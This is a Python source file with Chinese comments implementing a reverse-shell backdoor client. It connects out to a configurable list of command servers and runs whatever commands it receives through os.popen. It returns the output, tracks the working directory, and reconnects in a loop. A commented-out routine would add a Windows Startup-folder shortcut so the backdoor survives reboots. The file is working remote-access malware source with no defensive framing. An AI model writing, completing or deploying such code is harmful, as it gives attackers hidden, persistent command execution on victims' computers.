import socket
import os
import threading
import time
import sys
import winshell

#修改于2025.6.8
# 服务器列表
server_list = [
    {"host": "127.0.0.1","port": 1000}
]
current_dir = os.getcwd()
script_path = os.path.abspath(sys.argv[0])

#def startup_main(exe_path): #开机自启动模块
#    try:
#        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
#        os.makedirs(startup_folder, exist_ok=True)
#        shortcut_path = os.path.join(startup_folder, os.path.basename(exe_path) + ".lnk")
#        # 如果快捷方式不存在或指向的文件不正确，则创建新的快捷方式
#        if not os.path.exists(shortcut_path) or os.path.realpath(shortcut_path) != exe_path:
#            winshell.CreateShortcut(
#                 Path=shortcut_path,
#                Target=exe_path,
#                Description="启动快捷方式",
#                Icon=(exe_path, 0)
#                )
#    except Exception as e:
#        return

def receive_commands(server_socket): #指令模块
    global current_dir
    while True:
        try:
            command = server_socket.recv(4096).decode('utf-8')
            if not command:
                break
            if command.strip().lower() == 'pwd':
                server_socket.send(current_dir.encode('utf-8'))
                continue
            if command.lower().startswith('cd '):
                try:
                    if '/d' in command.lower():
                        new_dir = command[command.lower().index('/d')+3:].strip()
                    else:
                        new_dir = command[3:].strip()
                    os.chdir(new_dir)
                    current_dir = os.getcwd()
                    output = f"目录已更改为: {current_dir}"
                except Exception as e:
                    output = f"更改目录失败: {str(e)}"
                server_socket.send(output.encode('utf-8'))
                continue
            output = os.popen(command).read()
            server_socket.send(output.encode('utf-8'))
        except Exception as e:
            print(f"与服务器通信时出错: {e}")
            break

def connect_to_server(): #连接服务器模块
    current_server_index = 0  # 当前尝试的服务器索引
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server = server_list[current_server_index]  # 获取当前服务器配置
        try:
            print(f"[*] 正在尝试连接服务器 {server['host']}:{server['port']}")
            client.connect((server['host'], server['port']))
            print(f"[*] 已连接到服务器 {server['host']}:{server['port']}")
            
            receive_thread = threading.Thread(
                target=receive_commands,
                args=(client,)
            )
            receive_thread.daemon = True
            receive_thread.start()
            receive_thread.join()
            
        except Exception as e:
            print(f"连接服务器 {server['host']}:{server['port']} 失败: {e}")
            
        finally:
            try:
                client.close()
            except:
                pass
            print("[*] 与服务器的连接已关闭")
        
        # 切换到下一个服务器（循环）
        current_server_index = (current_server_index + 1) % len(server_list)
        print(f"\n正在尝试重新连接... 下一个服务器: {server_list[current_server_index]['host']}:{server_list[current_server_index]['port']}")
        time.sleep(5)

if __name__ == "__main__":
    print(script_path)
#    startup_main(script_path)
    connect_to_server() # 启动主连接
